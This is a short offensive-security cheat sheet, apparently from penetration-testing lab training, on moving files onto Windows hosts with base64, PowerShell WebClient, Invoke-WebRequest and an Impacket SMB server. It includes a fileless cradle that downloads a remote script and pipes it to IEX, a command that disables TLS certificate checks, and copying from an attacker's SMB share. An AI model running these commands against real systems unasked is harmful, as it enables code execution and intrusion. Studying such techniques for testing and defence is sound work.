---
tags:
  - Windows
  - File_Transfer
---
## Base64
### Encode
```bash
# Kali
cat <File> | base64 -w 0; echo
```
### Decode

> [!caution] Note: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.

```PowerShell
# Windows
[IO.File]::WriteAllBytes("C:\Users\Public\<File_Name>", [Convert]::FromBase64String("<Base64_Output>"))
```

* * *
## PowerShell

> [!note] Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity.

| Method              | Description                                                                                  |
| ------------------- | -------------------------------------------------------------------------------------------- |
| OpenRead            | Returns the data from a resource as a Stream.                                                |
| OpenReadAsync       | Returns the data from a resource without blocking the calling thread.                        |
| DownloadData        | Downloads data from a resource and returns a Byte array.                                     |
| DownloadDataAsync   | Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| DownloadFile        | Downloads data from a resource to a local file.                                              |
| DownloadFileAsync   | Downloads data from a resource to a local file without blocking the calling thread.          |
| DownloadString      | Downloads a String from a resource and returns a String.                                     |
| DownloadStringAsync | Downloads a String from a resource without blocking the calling thread.                      |

### PowerShell DownloadString - Fileless Method
```PowerShell
# Windows (Fileless Method)
(New-Object Net.WebClient).DownloadFile('<Target_File_URL>','<Output_File_Name>')
```

```PowerShell
# Windows (Piped Fileless Method)
(New-Object Net.WebClient).DownloadString('https://<File>') | IEX
```

> [!caution] Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:

```PowerShell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
### PowerShell Invoke-WebRequest

> [!note] From PowerShell 3.0 onwards, the `Invoke-WebRequest` cmdlet is also available, but it is noticeably slower at downloading files.

```PowerShell
Invoke-WebRequest https://<File> -OutFile <File>
```

* * *
## SMB

> [!note] We need to create an SMB server in our Pwnbox with `smbserver.py` from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.
### Start Server
```bash
# Kali
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
### Copy a File from the SMB Server
```PowerShell
# Windows
copy \\<Kali_IP>\share\<File>
```

> [!caution] New versions of Windows block unauthenticated guest access, as we can see in the following command:

```bash
# Kali
sudo impacket-smbserver share -smb2support /tmp/smbshare -user <Username> -password <Password>
```

```PowerShell
# Windows
net use n: \\<Kali_IP>\share /user:<Username> <Password>
```